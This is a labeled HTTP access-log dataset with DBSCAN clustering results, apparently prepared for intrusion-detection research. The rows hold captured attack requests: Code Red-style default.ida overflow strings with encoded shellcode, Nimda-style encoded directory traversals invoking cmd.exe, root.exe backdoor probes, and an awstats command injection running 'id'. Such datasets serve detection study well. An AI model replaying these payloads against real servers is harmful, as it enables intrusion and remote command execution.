#------------------------------------------------------------------------------------------------------------
#  ~ DateTime: 2021-02-09 00:10:18
#  ~ Dataframe name: "http_access_log"
#  ~ Number of events in the dataframe: 3554
#  ~ Number of unique labels ('label_event_type') in the dataframe: 12
#  ~ Selected features set for the clustering: ['HTTP_method', 'ClientRequestLine@', 'StatusCode', 'ObjectSize~', 'Referrer~', 'Agent@']
#  ~ The dataframe was scaled using the scaler: MinMaxScaler
#  ~ Parameters:  EPS=0.10286568826994683  MinPts=2 (The EPS parameter was calculated in 0.011141 seconds)
#  ~ The DBSCAN clustering process was performed in 0.162435 seconds
#  ~ Results summary: (20 Clus. | 5 Outl. | Homg.: 99.93% | Comp.: 93.22% | V-measure: 96.46% | AR: 97.24% | AMI: 96.41%)
#
#  ~ Details of clusters:
#       Cluster [0] contains 484 items. MV:["A050"]. Details:{'A05': 484}
#       Cluster [1] contains 979 items. MV:["A011"]. Details:{'A01': 979}
#       Cluster [2] contains 109 items. MV:["A022"]. Details:{'A02': 109}
#       Cluster [3] contains 86 items. MV:["A053"]. Details:{'A05': 86}
#       Cluster [4] contains 587 items. MV:["A034"]. Details:{'A03': 587}
#       Cluster [5] contains 23 items. MV:["A045"]. Details:{'A04': 23}
#       Cluster [6] contains 14 items. MV:["A046"]. Details:{'A04': 14}
#       Cluster [7] contains 3 items. MV:["A037"]. Details:{'A03': 3}
#       Cluster [8] contains 46 items. MV:["A098"]. Details:{'A09': 46}
#       Cluster [9] contains 100 items. MV:["A089"]. Details:{'A08': 100}
#       Cluster [10] contains 125 items. MV:["A0610"]. Details:{'A06': 125}
#       Cluster [11] contains 16 items. MV:["A0411"]. Details:{'A04': 16}
#       Cluster [12] contains 32 items. MV:["A0812"]. Details:{'A08': 32}
#       Cluster [13] contains 769 items. MV:["A1013"]. Details:{'A10': 769}
#       Cluster [14] contains 14 items. MV:["A1114"]. Details:{'A11': 14}
#       Cluster [15] contains 54 items. MV:["A1115"]. Details:{'A05': 1, 'A11': 53}
#       Cluster [16] contains 5 items. MV:["A0416"]. Details:{'A04': 5}
#       Cluster [17] contains 57 items. MV:["A1217"]. Details:{'A12': 57}
#       Cluster [18] contains 23 items. MV:["A0718"]. Details:{'A07': 23}
#       Cluster [19] contains 23 items. MV:["A1119"]. Details:{'A11': 23}
#
#  ~ Details of outliers: {'A03': 1, 'A04': 1, 'A05': 3}
#
#  ~ Confusion matrix:
#     +--------+-----------------------------------------------------------------------------------+
#     | Actual +                                    Predicted                                      |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |        | A01  | A02  | A03  | A04  | A05  | A06  | A07  | A08  | A09  | A10  | A11  | A12  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |  A01   | 979  |      |      |      |      |      |      |      |      |      |      |      |
#     |  A02   |      | 109  |      |      |      |      |      |      |      |      |      |      |
#     |  A03   |      |      | 590  |      |      |      |      |      |      |      |      |      |
#     |  A04   |      |      |      |  58  |      |      |      |      |      |      |      |      |
#     |  A05   |      |      |      |      | 570  |      |      |      |      |      |  1   |      |
#     |  A06   |      |      |      |      |      | 125  |      |      |      |      |      |      |
#     |  A07   |      |      |      |      |      |      |  23  |      |      |      |      |      |
#     |  A08   |      |      |      |      |      |      |      | 132  |      |      |      |      |
#     |  A09   |      |      |      |      |      |      |      |      |  46  |      |      |      |
#     |  A10   |      |      |      |      |      |      |      |      |      | 769  |      |      |
#     |  A11   |      |      |      |      |      |      |      |      |      |      |  90  |      |
#     |  A12   |      |      |      |      |      |      |      |      |      |      |      |  57  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#
#  ~ Note: to import this file into Python, use: "DF = pandas.read_csv(file_name, sep=',', comment='#')"
#
#------------------------------------------------------------------------------------------------------------
DateTime~,Referrer~,ClientRequestLine@,Agent@,ObjectSize~,Http_protocol@,HTTP_method,ClientIP$,StatusCode,label_event_type~,label_IPpair_ID~,phase1_predicted_label~
1108546064,"-","/","Microsoft-WebDAV-MiniRedir/5.1.2600",0,"HTTP/1.1","OPTIONS",9004249111162,"'200'","A09","S350","A_8"
1108546064,"-","/","Microsoft-WebDAV-MiniRedir/5.1.2600",0,"HTTP/1.1","OPTIONS",9004249111162,"'200'","A09","S350","A_8"
1108546080,"-","/","Microsoft-WebDAV-MiniRedir/5.1.2600",0,"HTTP/1.1","OPTIONS",9004249111162,"'200'","A09","S350","A_8"
1108546087,"-","/","Microsoft-WebDAV-MiniRedir/5.1.2600",0,"HTTP/1.1","OPTIONS",9004249111162,"'200'","A09","S350","A_8"
1108546088,"-","/","Microsoft-WebDAV-MiniRedir/5.1.2600",0,"HTTP/1.1","OPTIONS",9004249111162,"'200'","A09","S350","A_8"
1108546093,"-","/","Microsoft-WebDAV-MiniRedir/5.1.2600",0,"HTTP/1.1","OPTIONS",9004249111162,"'200'","A09","S350","A_8"
1108546101,"-","/","Microsoft-WebDAV-MiniRedir/5.1.2600",0,"HTTP/1.1","OPTIONS",9004249111162,"'200'","A09","S350","A_8"
1108546103,"-","/","Microsoft-WebDAV-MiniRedir/5.1.2600",0,"HTTP/1.1","OPTIONS",9004249111162,"'200'","A09","S350","A_8"
1108546106,"-","/","Microsoft-WebDAV-MiniRedir/5.1.2600",0,"HTTP/1.1","OPTIONS",9004249111162,"'200'","A09","S350","A_8"
1108566124,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9200050011109,"'403'","A05","S64","A_0"
1108567236,"-","http://www.google.com/intl/zh-CN/","HTTPClient",1052,"HTTP/1.0","GET",9218007163019,"'404'","A08","S217","A_12"
1108572723,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9024009145131,"'403'","A05","S342","A_0"
1108582402,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9141152185177,"'403'","A05","S16","A_0"
1108589015,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9218232208173,"'403'","A05","S201","A_0"
1108589270,"-","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","-",1061,"HTTP/1.0","GET",9061053032222,"'404'","A01","S413","A_1"
1108590057,"-","http://www.google.com/intl/zh-CN/","HTTPClient",1052,"HTTP/1.0","GET",9218007163019,"'404'","A08","S217","A_12"
1108595831,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9064180246247,"'403'","A05","S441","A_0"
1108597649,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9080063059010,"'403'","A05","S568","A_0"
1108600960,"-","http://www.google.com/intl/zh-CN/","HTTPClient",1052,"HTTP/1.0","GET",9218007163019,"'404'","A08","S217","A_12"
1108603647,"-","/scripts/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9201129065141,"'404'","A01","S67","A_1"
1108603647,"-","/MSADC/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9201129065141,"'404'","A01","S67","A_1"
1108603648,"-","/c/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9201129065141,"'404'","A01","S67","A_1"
1108603648,"-","/d/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9201129065141,"'404'","A01","S67","A_1"
1108603648,"-","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9201129065141,"'404'","A01","S67","A_1"
1108603648,"-","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9201129065141,"'404'","A01","S67","A_1"
1108603649,"-","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9201129065141,"'404'","A01","S67","A_1"
1108603649,"-","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9201129065141,"'404'","A01","S67","A_1"
1108603649,"-","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9201129065141,"'404'","A01","S67","A_1"
1108603649,"-","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9201129065141,"'404'","A01","S67","A_1"
1108603649,"-","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9201129065141,"'404'","A01","S67","A_1"
1108603650,"-","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9201129065141,"'404'","A01","S67","A_1"
1108603650,"-","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9201129065141,"'400'","A02","S67","A_2"
1108603650,"-","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9201129065141,"'400'","A02","S67","A_2"
1108603650,"-","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9201129065141,"'404'","A01","S67","A_1"
1108603651,"-","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9201129065141,"'404'","A01","S67","A_1"
1108611765,"-","http://www.google.com/intl/zh-CN/","HTTPClient",1052,"HTTP/1.0","GET",9218007163019,"'404'","A08","S217","A_12"
1108617209,"-","/scripts/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069153013148,"'404'","A01","S537","A_1"
1108617209,"-","/MSADC/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069153013148,"'404'","A01","S537","A_1"
1108617209,"-","/c/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069153013148,"'404'","A01","S537","A_1"
1108617209,"-","/d/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069153013148,"'404'","A01","S537","A_1"
1108617210,"-","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069153013148,"'404'","A01","S537","A_1"
1108617210,"-","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069153013148,"'404'","A01","S537","A_1"
1108617210,"-","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069153013148,"'404'","A01","S537","A_1"
1108617210,"-","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069153013148,"'404'","A01","S537","A_1"
1108617211,"-","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069153013148,"'404'","A01","S537","A_1"
1108617211,"-","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069153013148,"'404'","A01","S537","A_1"
1108617211,"-","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069153013148,"'404'","A01","S537","A_1"
1108617211,"-","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069153013148,"'404'","A01","S537","A_1"
1108617211,"-","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9069153013148,"'400'","A02","S537","A_2"
1108617212,"-","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9069153013148,"'400'","A02","S537","A_2"
1108617212,"-","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069153013148,"'404'","A01","S537","A_1"
1108617212,"-","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069153013148,"'404'","A01","S537","A_1"
1108622026,"-","http://www.google.com/intl/zh-CN/","HTTPClient",1052,"HTTP/1.0","GET",9218007163019,"'404'","A08","S217","A_12"
1108632767,"-","http://www.google.com/intl/zh-CN/","HTTPClient",1052,"HTTP/1.0","GET",9218007163019,"'404'","A08","S217","A_12"
1108640676,"-","/NULL.printer","-",1061,"-","GET",9081006250202,"'404'","A01","S575","A_1"
1108642454,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9061010007243,"'403'","A05","S376","A_0"
1108653818,"-","http://www.google.com/intl/zh-CN/","HTTPClient",1052,"HTTP/1.0","GET",9218007163019,"'404'","A08","S217","A_12"
1108669790,"-","/NULL.printer","-",1061,"-","GET",9061088122010,"'404'","A01","S417","A_1"
1108670227,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9061010007119,"'403'","A05","S361","A_0"
1108677223,"-","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","-",1061,"HTTP/1.0","GET",9172134023011,"'404'","A01","S31","A_1"
1108686830,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9209213220227,"'403'","A05","S120","A_0"
1108708297,"-","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","-",1061,"-","GET",9206049194036,"'404'","A01","S99","A_1"
1108708297,"-","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","-",1061,"-","GET",9206049194036,"'404'","A01","S99","A_1"
1108708299,"-","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","-",1061,"-","GET",9206049194036,"'404'","A01","S99","A_1"
1108708299,"-","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","-",1061,"-","GET",9206049194036,"'404'","A01","S99","A_1"
1108708299,"-","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","-",1061,"-","GET",9206049194036,"'404'","A01","S99","A_1"
1108708301,"-","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir","-",1061,"-","GET",9206049194036,"'404'","A01","S99","A_1"
1109087499,"-","/scripts/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9211059000040,"'404'","A01","S155","A_1"
1109087504,"-","/MSADC/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9211059000040,"'404'","A01","S155","A_1"
1109087509,"-","/c/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9211059000040,"'404'","A01","S155","A_1"
1109087513,"-","/d/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9211059000040,"'404'","A01","S155","A_1"
1109087517,"-","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9211059000040,"'404'","A01","S155","A_1"
1109087522,"-","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9211059000040,"'404'","A01","S155","A_1"
1109087526,"-","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9211059000040,"'404'","A01","S155","A_1"
1109087531,"-","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9211059000040,"'404'","A01","S155","A_1"
1109087536,"-","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9211059000040,"'404'","A01","S155","A_1"
1109087541,"-","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9211059000040,"'404'","A01","S155","A_1"
1109087545,"-","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9211059000040,"'404'","A01","S155","A_1"
1109087550,"-","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9211059000040,"'404'","A01","S155","A_1"
1109087555,"-","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9211059000040,"'400'","A02","S155","A_2"
1109087560,"-","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9211059000040,"'400'","A02","S155","A_2"
1109087564,"-","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9211059000040,"'404'","A01","S155","A_1"
1109087569,"-","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9211059000040,"'404'","A01","S155","A_1"
1109097707,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9069139247161,"'403'","A05","S536","A_0"
1109104648,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9018241006024,"'403'","A05","S42","A_0"
1109109182,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9218019063215,"'403'","A05","S191","A_0"
1109120997,"-","/sumthin","-",1061,"HTTP/1.0","GET",9212059013202,"'404'","A01","S160","A_1"
1109123885,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9208189245200,"'403'","A05","S108","A_0"
1109124580,"-","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","-",1061,"HTTP/1.0","GET",9063245085123,"'404'","A01","S434","A_1"
1109145758,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9202164101056,"'403'","A05","S78","A_0"
1109157759,"-","/scripts/nsiislog.dll","-",1050,"HTTP/1.1","GET",9081006250202,"'404'","A01","S575","A_1"
1109162277,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9219136113141,"'403'","A05","S240","A_0"
1109175414,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9218088202208,"'403'","A05","S232","A_0"
1109177170,"-","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","-",1061,"HTTP/1.0","GET",9063245085123,"'404'","A01","S434","A_1"
1109188221,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9068143095195,"'403'","A05","S514","A_0"
1109197136,"-","/scripts/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069229028252,"'404'","A01","S543","A_1"
1109197136,"-","/MSADC/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069229028252,"'404'","A01","S543","A_1"
1109197137,"-","/c/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069229028252,"'404'","A01","S543","A_1"
1109197137,"-","/d/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069229028252,"'404'","A01","S543","A_1"
1109197137,"-","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069229028252,"'404'","A01","S543","A_1"
1109197137,"-","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069229028252,"'404'","A01","S543","A_1"
1109197138,"-","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069229028252,"'404'","A01","S543","A_1"
1109197138,"-","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069229028252,"'404'","A01","S543","A_1"
1109197138,"-","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069229028252,"'404'","A01","S543","A_1"
1109197139,"-","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069229028252,"'404'","A01","S543","A_1"
1109197139,"-","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069229028252,"'404'","A01","S543","A_1"
1109197139,"-","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069229028252,"'404'","A01","S543","A_1"
1109197139,"-","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9069229028252,"'400'","A02","S543","A_2"
1109197140,"-","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9069229028252,"'400'","A02","S543","A_2"
1109197140,"-","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069229028252,"'404'","A01","S543","A_1"
1109197140,"-","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9069229028252,"'404'","A01","S543","A_1"
1109197936,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9198031097149,"'403'","A05","S58","A_0"
1109198671,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9061183081129,"'403'","A05","S400","A_0"
1109202767,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9067086096100,"'403'","A05","S510","A_0"
1109213743,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9012047120130,"'403'","A05","S4","A_0"
1109215964,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9203084191209,"'403'","A05","S92","A_0"
1109218192,"-","/scripts/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9024099140064,"'404'","A01","S345","A_1"
1109218193,"-","/MSADC/root.exe?/c+dir","-",1041,"HTTP/1.0","GET",9024099140064,"'404'","A01","S345","A_1"
1109218193,"-","/c/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9024099140064,"'404'","A01","S345","A_1"
1109218193,"-","/d/winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9024099140064,"'404'","A01","S345","A_1"
1109218193,"-","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9024099140064,"'404'","A01","S345","A_1"
1109218193,"-","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9024099140064,"'404'","A01","S345","A_1"
1109218193,"-","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9024099140064,"'404'","A01","S345","A_1"
1109218193,"-","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9024099140064,"'404'","A01","S345","A_1"
1109218194,"-","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9024099140064,"'404'","A01","S345","A_1"
1109218194,"-","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9024099140064,"'404'","A01","S345","A_1"
1109218194,"-","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9024099140064,"'404'","A01","S345","A_1"
1109218194,"-","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9024099140064,"'404'","A01","S345","A_1"
1109218194,"-","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9024099140064,"'400'","A02","S345","A_2"
1109218194,"-","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","-",974,"HTTP/1.0","GET",9024099140064,"'400'","A02","S345","A_2"
1109218194,"-","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9024099140064,"'404'","A01","S345","A_1"
1109218195,"-","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","-",1041,"HTTP/1.0","GET",9024099140064,"'404'","A01","S345","A_1"
1109228497,"-","/","Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",2898,"HTTP/1.1","GET",9218018169220,"'403'","A05","S187","A_0"
1109229403,"-","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)",1051,"HTTP/1.1","GET",9066099250098,"'404'","A10","S488","A_13"
1109229403,"-","//cgi-bin/awstats/awstats.pl?configdir=|%20id%20|","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)",1051,"HTTP/1.1","GET",9066099250098,"'404'","A10","S488","A_13"
1109229404,"-","//cgi-bin/awstats.pl?configdir=|%20id%20|","Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)",1051,"HTTP/1.1","GET",9066099250098,"'404'","A10","S488","A_13"
